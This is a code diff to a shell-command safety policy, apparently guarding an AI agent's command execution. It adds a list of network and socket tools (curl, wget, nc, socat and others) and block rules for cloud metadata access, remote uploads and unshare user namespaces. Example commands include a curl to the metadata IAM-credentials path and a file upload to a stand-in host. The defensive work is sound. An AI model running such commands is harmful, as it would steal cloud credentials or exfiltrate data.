@@ -51,6 +51,7 @@ __export(exports_core_shell, {
   MAX_REASON_LENGTH: () => MAX_REASON_LENGTH,
   PYTHON_INTERPRETER_PATTERN: () => PYTHON_INTERPRETER_PATTERN,
   PolicyFilesystemError: () => PolicyFilesystemError,
+  REQUEST_CLIENT_COMMANDS: () => REQUEST_CLIENT_COMMANDS,
   SECRET_BASENAME_RULES: () => SECRET_BASENAME_RULES,
   SECRET_BROAD_SSH_KEY_BASENAME_RULE: () => SECRET_BROAD_SSH_KEY_BASENAME_RULE,
   SECRET_CODING_CLI_RULES: () => SECRET_CODING_CLI_RULES,
@@ -400,6 +401,23 @@ var DISPLAY_COMMANDS = new Set([
   "wall",
   "mesg",
   "notify-send"
+]);
+var REQUEST_CLIENT_COMMANDS = new Set([
+  "curl",
+  "wget",
+  "aria2c",
+  "http",
+  "https",
+  "xh",
+  "xhs",
+  "httpie",
+  "fetch",
+  "lwp-request",
+  "nc",
+  "ncat",
+  "netcat",
+  "socat",
+  "telnet"
 ]);
 // src/core/io/safe-read.ts
 var import_node_fs = require("node:fs");
@@ -1678,6 +1696,30 @@ var DESTRUCTIVE_COMMAND_RULE_DEFINITIONS = [
     intent: "manual_only"
   },
   {
+    id: "network.cloud-metadata",
+    category: "Network",
+    label: "Cloud metadata endpoint",
+    description: "Blocks HTTP clients, raw socket tools, and code interpreters naming a cloud metadata host (169.254.169.254, fd00:ec2::254, 169.254.170.2, 169.254.170.23, fd00:ec2::23, metadata.google.internal, metadata.goog, 100.100.100.200).",
+    example: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    intent: "manual_only"
+  },
+  {
+    id: "network.upload-remote",
+    category: "Network",
+    label: "Data upload to a remote host",
+    description: "Blocks curl and wget requests that send a body or upload a file unless every URL is loopback (localhost, *.localhost, 127.0.0.0/8, 0.0.0.0, [::1]).",
+    example: "curl -T backup.tar https://uploads.example.com/",
+    intent: "manual_only"
+  },
+  {
+    id: "unshare.user-namespace",
+    category: "Execution",
+    label: "unshare user namespace",
+    description: "Blocks unshare creating a user namespace: -U/--user, -r/--map-root-user, -c/--map-current-user, --map-user(s), --map-group(s), or --map-auto.",
+    example: "unshare -r id",
+    intent: "manual_only"
+  },
+  {
     id: "interpreter.dangerous-command",
     category: "Execution",
     label: "Interpreter dangerous command",
@@ -2083,6 +2125,11 @@ function scanSequence(source, start, end, limits, parseState, depth, closing) {
         continue;
       }
       i++;
+      continue;
+    }
+    if (char === "\\" && source[i + 1] === `
+`) {
+      i += 2;
       continue;
     }
     if (char === "#") {
